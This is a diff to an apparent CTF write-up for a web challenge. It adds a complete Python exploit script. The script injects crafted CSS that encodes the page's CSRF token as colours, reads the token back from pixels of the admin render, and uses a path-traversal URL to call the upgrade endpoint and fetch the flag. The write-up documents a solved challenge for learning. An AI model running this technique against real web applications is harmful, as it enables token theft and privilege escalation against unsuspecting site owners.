@@ -160,6 +160,89 @@ With this link it is possible to request to admin to visit the upgrade path with
 
 After that we just visit the /flag endpoint and get `GPNCTF{f4v0rIte_ColoR_0X000000_Lik3_The_Nigh7_sKy}`
 
+Here is the full exploit script:
+```python
+import re
+from io import BytesIO
+
+# Needs to be installed
+import requests         # pip install requests
+from PIL import Image   # pip install pillow
+
+import sys
+
+if len(sys.argv) > 1:
+    URL_PREFIX = sys.argv[1]
+else:
+    URL_PREFIX = "http://localhost:1337"
+
+def intToHex(a: int) -> str:
+    b = hex(a)[2:]
+    return b.rjust(2, "0")
+
+def exploit() -> bool:
+
+    s = requests.Session()
+
+
+    r = s.get(f"{URL_PREFIX}/profile/me")
+    profile_id = re.search(r"\d*$", r.url).group(0)
+
+    cookie = s.cookies.get("connect.sid")
+    csrfToken = re.search(r"data-csrf=\"(\d*)\"",r.text).group(1)
+    print(f"{profile_id=} {csrfToken=} {cookie=}")
+
+
+    exploit_css_query = f"html=%3Ch2%3ELook+at+my+awesome+profile%3C%2Fh2%3E&style=script%7B%0A++++--rawToken%3A+attr%28data-csrf+type%28%3Cinteger%3E%29%29%3B%0A%0A++++--background-blue%3A+mod%28var%28--rawToken%29%2C+256%29%3B%0A%0A++++--temp1%3A+calc%28%28var%28--rawToken%29+-+var%28--background-blue%29%29+%2F+256%29%3B%0A++++--background-green%3A+mod%28var%28--temp1%29%2C+256%29%3B%0A%0A++++--temp2%3A+calc%28%28var%28--temp1%29+-+var%28--background-green%29%29+%2F+256%29%3B%0A++++--background-red%3A+mod%28var%28--temp2%29%2C+256%29%3B%0A%0A++++--temp3%3A+calc%28%28var%28--temp2%29+-+var%28--background-red%29%29+%2F+256%29%3B%0A++++--font-blue%3A+mod%28var%28--temp3%29%2C+256%29%3B%0A%0A++++--temp4%3A+calc%28%28var%28--temp3%29+-+var%28--font-blue%29%29+%2F+256%29%3B%0A++++--font-green%3A+mod%28var%28--temp4%29%2C+256%29%3B%0A%0A++++--temp5%3A+calc%28%28var%28--temp4%29+-+var%28--font-green%29%29+%2F+256%29%3B%0A++++--font-red%3A+mod%28var%28--temp5%29%2C+256%29%3B%0A++++%0A++++%2F*+Browser+only+support+32+Bit+Integer+use+only+31+Bit++because+first+bit+is+for+sign+*%2F%0A++++--font-green%3A+0%3B%0A++++--font-red%3A+0%3B%0A%0A++++--background-color%3A+color%28srgb+calc%28var%28--background-red%29+%2F+255%29+calc%28var%28--background-green%29+%2F+255%29+calc%28var%28--background-blue%29+%2F+255%29%29%3B%0A++++--font-color%3A+color%28srgb+calc%28var%28--font-red%29+%2F+255%29+calc%28var%28--font-green%29+%2F+255%29+calc%28var%28--font-blue%29+%2F+255%29%29%3B%0A++++%0A++++%0A++++background-color%3A+var%28--background-color%29%3B%0A++++border%3A+20px+solid+var%28--font-color%29%3B%0A%0A++++display%3A+block%3B%0A++++width%3A+500px%3B%0A++++height%3A+500px%3B%0A%7D%0A"
+    r = s.get(f"{URL_PREFIX}/api/profile/{profile_id}/edit?{exploit_css_query}&csrfToken={csrfToken}")
+
+    r = s.get(f"{URL_PREFIX}/admin/{profile_id}")
+    image = Image.open(BytesIO(r.content))
+    # image.show()
+
+    x, y = 10, 10
+    pixel_color = image.getpixel((x, y))
+    print(f"The color of the pixel at ({x}, {y}) is {pixel_color}")
+    b_2 = pixel_color[2]
+
+    x, y = 30, 30
+    pixel_color = image.getpixel((x, y))
+    print(f"The color of the pixel at ({x}, {y}) is {pixel_color}")
+
+
+    r_1 = pixel_color[0]
+    g_1 = pixel_color[1]
+    b_1 = pixel_color[2]
+
+
+    leaked_csrf_hex = f"{intToHex(b_2)}{intToHex(r_1)}{intToHex(g_1)}{intToHex(b_1)}"
+
+    leaked_csrf = int(leaked_csrf_hex, 16)
+    print(f"{leaked_csrf_hex=} - {leaked_csrf=}")
+
+
+    r = s.get(f"{URL_PREFIX}/admin/{profile_id}%2F..%2F..%2F..%2F..%2F..%2Fapi%2Fupgrade%2F{profile_id}%3FcsrfToken%3D{leaked_csrf}")
+    # image = Image.open(BytesIO(r.content))
+    # image.show()
+
+    r = s.get(f"{URL_PREFIX}/flag")
+
+    print(r.text)
+    return not r.text.startswith("<!DOCTYPE html>")
+
+
+def run_mutiple():
+    success = 0
+    runs = 10
+    for i in range(runs):
+        if exploit():
+            success += 1
+
+    print(f"{success} of {runs} worked")
+
+if __name__ == "__main__":
+    exploit()
+```
 
 ### The unintended solution
 There has been a bug in the login system of the bot.
